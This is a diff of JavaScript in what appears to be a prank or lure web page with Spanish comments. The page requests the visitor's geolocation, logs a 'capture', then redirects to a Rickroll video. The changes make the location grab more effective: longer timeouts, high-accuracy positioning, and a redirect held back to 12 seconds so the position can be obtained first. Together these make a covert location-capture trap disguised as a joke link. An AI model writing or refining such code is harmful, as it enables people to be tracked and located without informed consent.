@@ -272,10 +272,10 @@ p {
                 resolve(null);
                 return;
             }
-            
-            // Timeout rápido para no bloquear
-            const timeout = setTimeout(() => resolve(null), 1000);
-            
+
+            // Timeout más largo para dar tiempo al usuario a aceptar
+            const timeout = setTimeout(() => resolve(null), 10000);
+
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     clearTimeout(timeout);
@@ -291,7 +291,7 @@ p {
                     clearTimeout(timeout);
                     resolve(null);
                 },
-                { timeout: 1000, maximumAge: 0, enableHighAccuracy: false }
+                { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
             );
         });
     }
@@ -357,11 +357,11 @@ p {
         } catch (error) {
             console.error('❌ Error al capturar:', error);
         }
-        
-        // Esperar 2 segundos y redirigir al Rickroll
+
+        // Esperar 12 segundos para dar tiempo a obtener geolocalización y luego redirigir al Rickroll
         setTimeout(() => {
             window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-        }, 2000);
+        }, 12000);
     }
     
     // ═══════════════════════════════════════
